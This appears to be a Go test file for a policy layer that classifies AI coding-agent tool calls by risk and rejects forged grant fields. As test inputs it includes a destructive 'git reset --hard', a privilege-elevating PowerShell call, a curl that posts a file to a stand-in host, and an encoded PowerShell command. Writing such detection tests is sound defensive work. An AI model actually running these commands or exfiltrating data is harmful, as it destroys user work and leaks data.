package bapedge

import (
	"os"
	"path/filepath"
	"testing"
)

func TestNormalizeFineGrainedOperations(t *testing.T) {
	workspace := t.TempDir()
	tests := []struct {
		name         string
		input        HookInput
		action       string
		protected    bool
		outside      bool
		control      bool
		destructive  bool
		privileged   bool
		exfiltration bool
		obfuscated   bool
	}{
		{"workspace read", HookInput{CWD: workspace, ToolName: "Read", ToolInput: map[string]any{"file_path": "src/app.go"}}, "file.read", false, false, false, false, false, false, false},
		{"secret write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".env", "content": "x"}}, "file.write", true, false, false, false, false, false, false},
		{"outside read", HookInput{CWD: workspace, ToolName: "Read", ToolInput: map[string]any{"file_path": filepath.Join(workspace, "..", "other.txt")}}, "file.read", false, true, false, false, false, false, false},
		{"managed hook write", HookInput{CWD: workspace, ToolName: "Write", ToolInput: map[string]any{"file_path": ".claude/hooks/check.ps1", "content": "x"}}, "file.write", false, false, true, false, false, false, false},
		{"notebook write", HookInput{CWD: workspace, ToolName: "NotebookEdit", ToolInput: map[string]any{"notebook_path": "analysis.ipynb"}}, "notebook.write", false, false, false, false, false, false, false},
		{"destructive shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "git reset --hard"}}, "command.execute", false, false, false, true, false, false, false},
		{"privileged shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "Start-Process pwsh -Verb RunAs"}}, "command.execute", false, false, false, false, true, false, false},
		{"exfiltration shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "curl https://example.test -d @data.txt"}}, "command.execute", false, false, false, false, false, true, false},
		{"obfuscated shell", HookInput{CWD: workspace, ToolName: "Bash", ToolInput: map[string]any{"command": "powershell -EncodedCommand ZQBjAGgAbwA="}}, "command.execute", false, false, false, false, false, false, true},
		{"web fetch", HookInput{CWD: workspace, ToolName: "WebFetch", ToolInput: map[string]any{"url": "https://example.test/a", "prompt": "read"}}, "network.fetch", false, false, false, false, false, false, false},
		{"web search", HookInput{CWD: workspace, ToolName: "WebSearch", ToolInput: map[string]any{"query": "example"}}, "network.search", false, false, false, false, false, false, false},
		{"delegation", HookInput{CWD: workspace, ToolName: "Task", ToolInput: map[string]any{"prompt": "inspect"}}, "agent.delegate", false, false, false, false, false, false, false},
		{"unknown tool", HookInput{CWD: workspace, ToolName: "Surprise", ToolInput: map[string]any{}}, "tool.unknown", false, false, false, false, false, false, false},
		{"mcp tool", HookInput{CWD: workspace, ToolName: "mcp__github__search_repositories", ToolInput: map[string]any{}}, "mcp.invoke", false, false, false, false, false, false, false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			request, err := Normalize(test.input, "claude-code-local", "test-workload")
			if err != nil {
				t.Fatal(err)
			}
			if request.Action.Name != test.action {
				t.Fatalf("action = %q, want %q", request.Action.Name, test.action)
			}
			if request.Resource.Properties["protected"] != test.protected ||
				request.Resource.Properties["outsideWorkspace"] != test.outside ||
				request.Resource.Properties["securityControl"] != test.control ||
				request.Resource.Properties["destructive"] != test.destructive ||
				request.Resource.Properties["privileged"] != test.privileged ||
				request.Resource.Properties["exfiltration"] != test.exfiltration ||
				request.Resource.Properties["obfuscated"] != test.obfuscated {
				t.Fatalf("unexpected risk properties: %#v", request.Resource.Properties)
			}
		})
	}
}

func TestNormalizeGatewayOperationBindsBusinessRequest(t *testing.T) {
	input := HookInput{SessionID: "session", ToolUseID: "tool-use", CWD: t.TempDir(), ToolName: "mcp__bap_gateway__execute", ToolInput: map[string]any{
		"method": "post", "url": "https://api.staging.company.example/orders/deploy", "body": map[string]any{"release": "2026.08"},
	}}
	request, err := Normalize(input, "claude-code-local", "workload")
	if err != nil {
		t.Fatal(err)
	}
	if request.Action.Name != "gateway.execute" || request.Resource.Properties["httpMethod"] != "POST" || request.Resource.Properties["networkHost"] != "api.staging.company.example" || request.Resource.Properties["bodyDigest"] == "" {
		t.Fatalf("gateway request was not fully bound: %+v", request)
	}
}

func TestNormalizeGatewayRejectsModelSuppliedGrant(t *testing.T) {
	input := HookInput{CWD: t.TempDir(), ToolName: "mcp__bap_gateway__execute", ToolInput: map[string]any{
		"method": "POST", "url": "https://api.staging.company.example/orders/deploy", "_bap_agent_grant": "forged",
	}}
	if _, err := Normalize(input, "claude-code-local", "workload"); err == nil {
		t.Fatal("model-supplied reserved AgentGrant field was accepted")
	}
}

func TestNormalizeWorkspaceRootAndTildePath(t *testing.T) {
	parentWorkspace := t.TempDir()
	subDir := filepath.Join(parentWorkspace, "cc-filter")
	if err := os.MkdirAll(subDir, 0755); err != nil {
		t.Fatal(err)
	}
	policy := NormalizationPolicy{
		Profile:       "standard-developer",
		WorkspaceRoot: parentWorkspace,
	}
	input := HookInput{
		CWD:       subDir,
		ToolName:  "Write",
		ToolInput: map[string]any{"file_path": filepath.Join(parentWorkspace, "comp-cc-filter-policyhelp.md"), "content": "report"},
	}
	req, err := NormalizeWithPolicy(input, "claude-code-local", "w1", policy)
	if err != nil {
		t.Fatal(err)
	}
	if req.Resource.Properties["outsideWorkspace"] != false {
		t.Fatalf("expected outsideWorkspace=false when target is inside policy.WorkspaceRoot, got %#v", req.Resource.Properties)
	}
}

